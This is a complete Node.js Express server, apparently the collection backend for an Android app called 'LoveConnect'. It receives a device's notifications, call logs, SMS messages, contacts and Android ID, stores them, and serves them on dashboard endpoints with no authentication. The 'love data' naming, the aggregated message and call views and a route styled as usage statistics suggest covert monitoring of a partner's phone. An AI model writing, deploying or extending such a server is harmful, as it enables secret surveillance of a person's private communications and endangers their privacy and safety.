const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(express.static('public'));

// Data directory
const dataDir = path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
}

console.log('💕 LoveConnect Global Server Starting...');
console.log('📁 Data directory:', dataDir);

// Load existing data
let deviceData = new Map();

function loadExistingData() {
    try {
        const files = fs.readdirSync(dataDir);
        const jsonFiles = files.filter(file => file.endsWith('.json'));
        
        console.log(`📁 Loading ${jsonFiles.length} existing data files...`);
        
        jsonFiles.forEach(file => {
            try {
                const filePath = path.join(dataDir, file);
                const data = JSON.parse(fs.readFileSync(filePath, 'utf8'));
                
                // Extract device ID from filename or data
                const deviceId = data.deviceInfo?.androidId || file.split('_')[1] || 'unknown';
                
                if (!deviceData.has(deviceId)) {
                    deviceData.set(deviceId, []);
                }
                deviceData.get(deviceId).push(data);
                
            } catch (error) {
                console.error(`Error loading file ${file}:`, error.message);
            }
        });
        
        console.log(`✅ Loaded data for ${deviceData.size} devices`);
        
    } catch (error) {
        console.log('🆕 No existing data found, starting fresh');
    }
}

// Helper functions
function saveDataToFile(data) {
    const deviceId = data.deviceInfo?.androidId || 'unknown';
    const timestamp = data.timestamp || Date.now();
    const filename = `usage_${deviceId}_${timestamp}.json`;
    const filepath = path.join(dataDir, filename);
    
    fs.writeFileSync(filepath, JSON.stringify(data, null, 2));
    console.log(`💾 Saved data to ${filename}`);
}

function getDeviceStats(deviceId) {
    const data = deviceData.get(deviceId) || [];
    if (data.length === 0) return null;
    
    const latest = data[data.length - 1];
    const loveData = latest.loveData || {};
    
    return {
        deviceId: deviceId,
        deviceModel: latest.deviceInfo?.model || latest.device || 'Unknown',
        lastSeen: latest.timestamp,
        notificationCount: loveData.notifications?.length || 0,
        callCount: loveData.calls?.length || 0,
        messageCount: loveData.messages?.length || 0,
        contactCount: loveData.contacts?.length || 0,
        totalEntries: data.length
    };
}

// API Routes

// Main data endpoint (from Android app)
app.post('/api/data', (req, res) => {
    try {
        console.log('📱 Received data from device');
        
        const data = req.body;
        data.timestamp = data.timestamp || Date.now();
        
        // Extract device ID
        const deviceId = data.deviceInfo?.androidId || data.device || 'unknown';
        
        // Store in memory
        if (!deviceData.has(deviceId)) {
            deviceData.set(deviceId, []);
        }
        deviceData.get(deviceId).push(data);
        
        // Save to file
        saveDataToFile(data);
        
        console.log(`✅ Data saved for device: ${deviceId}`);
        console.log(`📊 Device now has ${deviceData.get(deviceId).length} total entries`);
        
        res.json({ 
            status: 'success', 
            message: 'Love data received successfully',
            deviceId: deviceId,
            totalEntries: deviceData.get(deviceId).length
        });
        
    } catch (error) {
        console.error('❌ Error processing data:', error);
        res.status(500).json({ 
            status: 'error', 
            message: 'Failed to process love data' 
        });
    }
});

// Legacy endpoint for compatibility
app.post('/usage_stats', (req, res) => {
    // Redirect to main API
    req.url = '/api/data';
    app.handle(req, res);
});

// Get all devices
app.get('/api/devices', (req, res) => {
    try {
        const devices = Array.from(deviceData.keys()).map(deviceId => {
            return getDeviceStats(deviceId);
        }).filter(device => device !== null);
        
        // Sort by last seen
        devices.sort((a, b) => b.lastSeen - a.lastSeen);
        
        res.json(devices);
        
    } catch (error) {
        console.error('Error getting devices:', error);
        res.status(500).json({ error: 'Failed to get devices' });
    }
});

// Get specific device data
app.get('/api/device/:deviceId', (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const data = deviceData.get(deviceId) || [];
        
        if (data.length === 0) {
            return res.status(404).json({ error: 'Device not found' });
        }
        
        // Get the latest data entry
        const latest = data[data.length - 1];
        const loveData = latest.loveData || {};
        
        // Combine all notifications from all entries
        const allNotifications = [];
        const allCalls = [];
        const allMessages = [];
        let contacts = [];
        
        data.forEach(entry => {
            const entryData = entry.loveData || {};
            if (entryData.notifications) allNotifications.push(...entryData.notifications);
            if (entryData.calls) allCalls.push(...entryData.calls);
            if (entryData.messages) allMessages.push(...entryData.messages);
            if (entryData.contacts) contacts = entryData.contacts; // Use latest contacts
        });
        
        // Remove duplicates and sort
        const uniqueNotifications = allNotifications.filter((notification, index, self) => 
            index === self.findIndex(n => n.timestamp === notification.timestamp && n.packageName === notification.packageName)
        ).sort((a, b) => b.timestamp - a.timestamp);
        
        const uniqueCalls = allCalls.filter((call, index, self) => 
            index === self.findIndex(c => c.date === call.date && c.number === call.number)
        ).sort((a, b) => b.date - a.date);
        
        const uniqueMessages = allMessages.filter((msg, index, self) => 
            index === self.findIndex(m => m.date === msg.date && m.body === msg.body)
        ).sort((a, b) => b.date - a.date);
        
        res.json({
            deviceId: deviceId,
            deviceInfo: latest.deviceInfo || {},
            lastUpdate: latest.timestamp,
            notifications: uniqueNotifications,
            calls: uniqueCalls,
            messages: uniqueMessages,
            contacts: contacts,
            stats: getDeviceStats(deviceId)
        });
        
    } catch (error) {
        console.error('Error getting device data:', error);
        res.status(500).json({ error: 'Failed to get device data' });
    }
});

// Get overall statistics
app.get('/api/stats', (req, res) => {
    try {
        let totalNotifications = 0;
        let totalCalls = 0;
        let totalMessages = 0;
        let totalContacts = 0;
        
        deviceData.forEach(data => {
            const latest = data[data.length - 1];
            const loveData = latest?.loveData || {};
            
            totalNotifications += loveData.notifications?.length || 0;
            totalCalls += loveData.calls?.length || 0;
            totalMessages += loveData.messages?.length || 0;
            totalContacts += loveData.contacts?.length || 0;
        });
        
        res.json({
            totalDevices: deviceData.size,
            totalNotifications,
            totalCalls,
            totalMessages,
            totalContacts,
            lastUpdate: Date.now()
        });
        
    } catch (error) {
        console.error('Error getting stats:', error);
        res.status(500).json({ error: 'Failed to get statistics' });
    }
});

// Reset device data
app.post('/api/reset/:deviceId', (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        
        if (deviceData.has(deviceId)) {
            deviceData.delete(deviceId);
            
            // Remove files for this device
            const files = fs.readdirSync(dataDir);
            files.filter(file => file.includes(deviceId)).forEach(file => {
                fs.unlinkSync(path.join(dataDir, file));
            });
            
            console.log(`🗑️ Reset data for device: ${deviceId}`);
            res.json({ status: 'success', message: `Data reset for device ${deviceId}` });
        } else {
            res.status(404).json({ error: 'Device not found' });
        }
        
    } catch (error) {
        console.error('Error resetting device:', error);
        res.status(500).json({ error: 'Failed to reset device data' });
    }
});

// Reset all data
app.post('/api/reset-all', (req, res) => {
    try {
        // Clear memory
        deviceData.clear();
        
        // Remove all files
        const files = fs.readdirSync(dataDir);
        files.forEach(file => {
            if (file.endsWith('.json')) {
                fs.unlinkSync(path.join(dataDir, file));
            }
        });
        
        console.log('🗑️ Reset ALL data');
        res.json({ status: 'success', message: 'All data has been reset' });
        
    } catch (error) {
        console.error('Error resetting all data:', error);
        res.status(500).json({ error: 'Failed to reset all data' });
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        uptime: process.uptime(),
        devices: deviceData.size,
        timestamp: Date.now()
    });
});

// Root endpoint
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Error handler
app.use((error, req, res, next) => {
    console.error('Server error:', error);
    res.status(500).json({ error: 'Internal server error' });
});

// Start server
loadExistingData();

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 LoveConnect Server running on port ${PORT}`);
    console.log(`🌐 Dashboard: http://localhost:${PORT}`);
    console.log(`💕 Global access ready for deployment!`);
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('💔 Server shutting down gracefully...');
    process.exit(0);
});
